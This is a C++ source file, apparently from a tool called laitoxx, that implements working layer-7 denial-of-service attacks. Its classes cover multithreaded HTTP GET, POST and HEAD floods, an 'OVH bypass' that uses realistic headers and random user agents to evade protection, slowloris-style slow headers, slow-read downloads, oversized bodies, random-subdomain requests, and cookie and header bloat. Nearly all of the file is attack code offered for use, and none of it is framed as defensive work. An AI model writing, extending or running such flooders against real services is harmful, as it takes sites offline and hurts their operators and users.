#include "l7_attacks.h"
#include <cstring>
#include <sstream>
#include <random>
#include <chrono>
#include <iomanip>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #define close closesocket
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #include <fcntl.h>
    #include <netdb.h>
    #define SOCKET int
    #define INVALID_SOCKET -1
#endif

namespace laitoxx {

// Resolve a hostname or IP string to a sockaddr_in.
// Handles both numeric IPs and domain names via getaddrinfo.
// error_out receives a human-readable error message on failure.
static bool resolve_target(const std::string& host, int port, sockaddr_in& out,
                           std::string* error_out = nullptr) {
    memset(&out, 0, sizeof(out));
    out.sin_family = AF_INET;
    out.sin_port = htons(static_cast<u_short>(port));

    if (host.empty()) {
        if (error_out) *error_out = "target_ip is empty";
        return false;
    }

    // Try numeric IP first (fast path)
    if (inet_pton(AF_INET, host.c_str(), &out.sin_addr) == 1) {
        return true;
    }

    // Fall back to DNS resolution
    struct addrinfo hints{}, *result = nullptr;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    int rc = getaddrinfo(host.c_str(), nullptr, &hints, &result);
    if (rc != 0 || !result) {
        if (error_out) {
#ifdef _WIN32
            *error_out = "DNS resolution failed for '" + host + "' (WSA error " + std::to_string(WSAGetLastError()) + ")";
#else
            *error_out = "DNS resolution failed for '" + host + "': " + gai_strerror(rc);
#endif
        }
        return false;
    }

    auto* ipv4 = reinterpret_cast<sockaddr_in*>(result->ai_addr);
    out.sin_addr = ipv4->sin_addr;
    freeaddrinfo(result);
    return true;
}

// Utility: Random string generator
static std::string random_string(size_t length, const std::string& charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, charset.size() - 1);

    std::string result;
    result.reserve(length);
    for (size_t i = 0; i < length; ++i) {
        result += charset[dis(gen)];
    }
    return result;
}

// Utility: Random User-Agent
static std::string random_user_agent() {
    static const char* agents[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15"
    };
    static std::random_device rd;
    static std::mt19937 gen(rd());
    static std::uniform_int_distribution<> dis(0, 4);
    return agents[dis(gen)];
}

// ============================================================================
// HTTPGetFlood
// ============================================================================
void HTTPGetFlood::start() {
    log("Starting HTTP GET flood on " + config_.target_ip + ":" + std::to_string(config_.port));
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&HTTPGetFlood::attack_worker, this);
    }
}

void HTTPGetFlood::attack_worker() {
    // Resolve DNS once per worker thread
    sockaddr_in addr{};
    std::string dns_err;
    if (!resolve_target(config_.target_ip, config_.port, addr, &dns_err)) {
        log("HTTPGetFlood worker failed: " + dns_err);
        return;
    }

    worker_loop([&]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
            std::stringstream ss;
            ss << "GET /" << random_string(8) << " HTTP/1.1\r\n"
               << "Host: " << config_.target_ip << "\r\n"
               << "User-Agent: " << random_user_agent() << "\r\n"
               << "Accept: */*\r\n"
               << "Connection: keep-alive\r\n\r\n";

            std::string request = ss.str();
            send(sock, request.c_str(), static_cast<int>(request.length()), 0);
            packets_sent_++;
        }
        close(sock);
    });
}

// ============================================================================
// HTTPPostFlood
// ============================================================================
void HTTPPostFlood::start() {
    log("Starting HTTP POST flood");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&HTTPPostFlood::attack_worker, this);
    }
}

std::string HTTPPostFlood::generate_post_data() {
    std::stringstream ss;
    ss << "{\"data\":\"" << random_string(256) << "\"}";
    return ss.str();
}

void HTTPPostFlood::attack_worker() {
    sockaddr_in addr{};
    std::string dns_err;
    if (!resolve_target(config_.target_ip, config_.port, addr, &dns_err)) {
        log("Worker failed: " + dns_err);
        return;
    }

    worker_loop([&]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
            std::string body = generate_post_data();
            std::stringstream ss;
            ss << "POST / HTTP/1.1\r\n"
               << "Host: " << config_.target_ip << "\r\n"
               << "User-Agent: " << random_user_agent() << "\r\n"
               << "Content-Type: application/json\r\n"
               << "Content-Length: " << body.length() << "\r\n"
               << "Connection: close\r\n\r\n"
               << body;

            std::string request = ss.str();
            send(sock, request.c_str(), request.length(), 0);
            packets_sent_++;
        }
        close(sock);
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    });
}

// ============================================================================
// HTTPHeadFlood
// ============================================================================
void HTTPHeadFlood::start() {
    log("Starting HTTP HEAD flood");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&HTTPHeadFlood::attack_worker, this);
    }
}

void HTTPHeadFlood::attack_worker() {
    sockaddr_in addr{};
    std::string dns_err;
    if (!resolve_target(config_.target_ip, config_.port, addr, &dns_err)) {
        log("Worker failed: " + dns_err);
        return;
    }

    worker_loop([&]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
            std::stringstream ss;
            ss << "HEAD / HTTP/1.1\r\n"
               << "Host: " << config_.target_ip << "\r\n"
               << "User-Agent: " << random_user_agent() << "\r\n\r\n";
            std::string request = ss.str();
            send(sock, request.c_str(), static_cast<int>(request.length()), 0);
            packets_sent_++;
        }
        close(sock);
    });
}

// ============================================================================
// OVHBypass
// ============================================================================
void OVHBypass::start() {
    log("Starting OVH bypass attack");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&OVHBypass::attack_worker, this);
    }
}

std::string OVHBypass::generate_random_path() {
    static const char* paths[] = {"/", "/index.html", "/api/v1/", "/static/", "/assets/"};
    static std::random_device rd;
    static std::mt19937 gen(rd());
    static std::uniform_int_distribution<> dis(0, 4);

    return std::string(paths[dis(gen)]) + "?" + random_string(16) + "=" + random_string(16);
}

std::string OVHBypass::generate_realistic_headers() {
    std::stringstream ss;
    ss << "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
       << "Accept-Language: en-US,en;q=0.5\r\n"
       << "Accept-Encoding: gzip, deflate\r\n"
       << "DNT: 1\r\n"
       << "Upgrade-Insecure-Requests: 1\r\n";
    return ss.str();
}

void OVHBypass::attack_worker() {
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        sockaddr_in addr{};
        if (!resolve_target(config_.target_ip, config_.port, addr)) return;

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
            std::stringstream ss;
            ss << "GET " << generate_random_path() << " HTTP/1.1\r\n"
               << "Host: " << config_.target_ip << "\r\n"
               << "User-Agent: " << random_user_agent() << "\r\n"
               << generate_realistic_headers()
               << "Connection: keep-alive\r\n\r\n";

            std::string request = ss.str();
            send(sock, request.c_str(), request.length(), 0);
            packets_sent_++;
        }
        close(sock);
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    });
}

// ============================================================================
// RHEXAttack
// ============================================================================
void RHEXAttack::start() {
    log("Starting RHEX attack");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&RHEXAttack::attack_worker, this);
    }
}

std::string RHEXAttack::generate_hex_string(size_t length) {
    return random_string(length, "0123456789abcdef");
}

void RHEXAttack::attack_worker() {
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        sockaddr_in addr{};
        if (!resolve_target(config_.target_ip, config_.port, addr)) return;

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
            std::stringstream ss;
            ss << "GET /?" << generate_hex_string(32) << "=1 HTTP/1.1\r\n"
               << "Host: " << config_.target_ip << "\r\n"
               << "User-Agent: " << random_user_agent() << "\r\n"
               << "Cookie: sess=0x" << generate_hex_string(64) << "\r\n"
               << "X-Forwarded-For: " << generate_hex_string(8) << "\r\n"
               << "Connection: close\r\n\r\n";

            std::string request = ss.str();
            send(sock, request.c_str(), request.length(), 0);
            packets_sent_++;
        }
        close(sock);
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    });
}

// ============================================================================
// STOMPAttack
// ============================================================================
void STOMPAttack::start() {
    log("Starting STOMP attack");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&STOMPAttack::attack_worker, this);
    }
}

void STOMPAttack::send_slow_headers(int sock) {
    std::string base = "GET / HTTP/1.1\r\n";
    send(sock, base.c_str(), base.length(), 0);
    std::this_thread::sleep_for(std::chrono::milliseconds(500));

    for (int i = 0; i < 10 && !stop_flag_; ++i) {
        std::string header = "X-" + random_string(10) + ": " + random_string(20) + "\r\n";
        send(sock, header.c_str(), header.length(), 0);
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
    }
}

void STOMPAttack::attack_worker() {
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        sockaddr_in addr{};
        if (!resolve_target(config_.target_ip, config_.port, addr)) return;

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
            send_slow_headers(sock);
            packets_sent_++;
        }
        close(sock);
    });
}

// ============================================================================
// STRESSAttack
// ============================================================================
void STRESSAttack::start() {
    log("Starting STRESS attack (large bodies)");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&STRESSAttack::attack_worker, this);
    }
}

void STRESSAttack::attack_worker() {
    const size_t body_size = 10 * 1024 * 1024; // 10MB
    std::vector<char> body(body_size, 'A');

    worker_loop([&]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        sockaddr_in addr{};
        if (!resolve_target(config_.target_ip, config_.port, addr)) return;

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
            std::stringstream ss;
            ss << "POST /upload HTTP/1.1\r\n"
               << "Host: " << config_.target_ip << "\r\n"
               << "Content-Length: " << body_size << "\r\n"
               << "Content-Type: application/octet-stream\r\n\r\n";

            std::string headers = ss.str();
            send(sock, headers.c_str(), headers.length(), 0);
            send(sock, body.data(), body.size(), 0);
            packets_sent_++;
        }
        close(sock);
        std::this_thread::sleep_for(std::chrono::seconds(1));
    });
}

// ============================================================================
// DYNAttack
// ============================================================================
void DYNAttack::start() {
    log("Starting DYN (random subdomain) attack");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&DYNAttack::attack_worker, this);
    }
}

std::string DYNAttack::generate_random_subdomain() {
    return random_string(10, "abcdefghijklmnopqrstuvwxyz0123456789");
}

void DYNAttack::attack_worker() {
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        sockaddr_in addr{};
        if (!resolve_target(config_.target_ip, config_.port, addr)) return;

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
            std::string subdomain = generate_random_subdomain() + "." + config_.target_ip;
            std::stringstream ss;
            ss << "GET / HTTP/1.1\r\n"
               << "Host: " << subdomain << "\r\n"
               << "User-Agent: " << random_user_agent() << "\r\n\r\n";

            std::string request = ss.str();
            send(sock, request.c_str(), request.length(), 0);
            packets_sent_++;
        }
        close(sock);
        std::this_thread::sleep_for(std::chrono::milliseconds(20));
    });
}

// ============================================================================
// NULLAttack
// ============================================================================
void NULLAttack::start() {
    log("Starting NULL attack (minimal headers)");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&NULLAttack::attack_worker, this);
    }
}

void NULLAttack::attack_worker() {
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        sockaddr_in addr{};
        if (!resolve_target(config_.target_ip, config_.port, addr)) return;

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
            std::string request = "GET / HTTP/1.1\r\n\r\n";
            send(sock, request.c_str(), request.length(), 0);
            packets_sent_++;
        }
        close(sock);
        std::this_thread::sleep_for(std::chrono::milliseconds(5));
    });
}

// ============================================================================
// COOKIEAttack
// ============================================================================
void COOKIEAttack::start() {
    log("Starting COOKIE attack");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&COOKIEAttack::attack_worker, this);
    }
}

std::string COOKIEAttack::generate_cookies() {
    std::stringstream ss;
    for (int i = 0; i < 50; ++i) {
        if (i > 0) ss << "; ";
        ss << "c" << i << "=" << random_string(100);
    }
    return ss.str();
}

void COOKIEAttack::attack_worker() {
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        sockaddr_in addr{};
        if (!resolve_target(config_.target_ip, config_.port, addr)) return;

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
            std::stringstream ss;
            ss << "GET / HTTP/1.1\r\n"
               << "Host: " << config_.target_ip << "\r\n"
               << "Cookie: " << generate_cookies() << "\r\n\r\n";

            std::string request = ss.str();
            send(sock, request.c_str(), request.length(), 0);
            packets_sent_++;
        }
        close(sock);
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    });
}

// ============================================================================
// PPSAttack
// ============================================================================
void PPSAttack::start() {
    log("Starting PPS (Packets Per Second) attack");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&PPSAttack::attack_worker, this);
    }
}

void PPSAttack::attack_worker() {
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        sockaddr_in addr{};
        if (!resolve_target(config_.target_ip, config_.port, addr)) return;

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
            std::string request = "GET / HTTP/1.1\r\n\r\n";
            send(sock, request.c_str(), request.length(), 0);
            packets_sent_++;
        }
        close(sock);
        // Minimal delay for maximum PPS
    });
}

// ============================================================================
// EVENAttack
// ============================================================================
void EVENAttack::start() {
    log("Starting EVEN attack (many headers)");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&EVENAttack::attack_worker, this);
    }
}

std::string EVENAttack::generate_many_headers() {
    std::stringstream ss;
    for (int i = 0; i < 100; ++i) {
        ss << "X-Custom-" << i << ": " << random_string(50) << "\r\n";
    }
    return ss.str();
}

void EVENAttack::attack_worker() {
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        sockaddr_in addr{};
        if (!resolve_target(config_.target_ip, config_.port, addr)) return;

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
            std::stringstream ss;
            ss << "GET / HTTP/1.1\r\n"
               << "Host: " << config_.target_ip << "\r\n"
               << generate_many_headers()
               << "\r\n";

            std::string request = ss.str();
            send(sock, request.c_str(), request.length(), 0);
            packets_sent_++;
        }
        close(sock);
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    });
}

// ============================================================================
// DOWNLOADERAttack
// ============================================================================
void DOWNLOADERAttack::start() {
    log("Starting DOWNLOADER attack (slow read)");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&DOWNLOADERAttack::attack_worker, this);
    }
}

void DOWNLOADERAttack::attack_worker() {
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        sockaddr_in addr{};
        if (!resolve_target(config_.target_ip, config_.port, addr)) return;

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
            // Randomise path to bypass caching
            std::string request = "GET /" + random_string(8) + ".bin HTTP/1.1\r\n"
                "Host: " + config_.target_ip + "\r\n"
                "Accept: */*\r\nRange: bytes=0-\r\nConnection: keep-alive\r\n\r\n";
            send(sock, request.c_str(), request.length(), 0);
            packets_sent_++;   // count the request immediately

            // Drain response byte-by-byte with timeout — keeps connection
            // open and exhausts server resources (slow-read variant)
#ifdef _WIN32
            DWORD rcvtv = 200;
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&rcvtv, sizeof(rcvtv));
#else
            struct timeval rcvtv{0, 200000};
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &rcvtv, sizeof(rcvtv));
#endif
            char buf[1];
            for (int i = 0; i < 60 && !stop_flag_; ++i) {
                if (recv(sock, buf, 1, 0) <= 0) break;
                std::this_thread::sleep_for(std::chrono::milliseconds(50));
            }
        }
        close(sock);
    });
}

} // namespace laitoxx
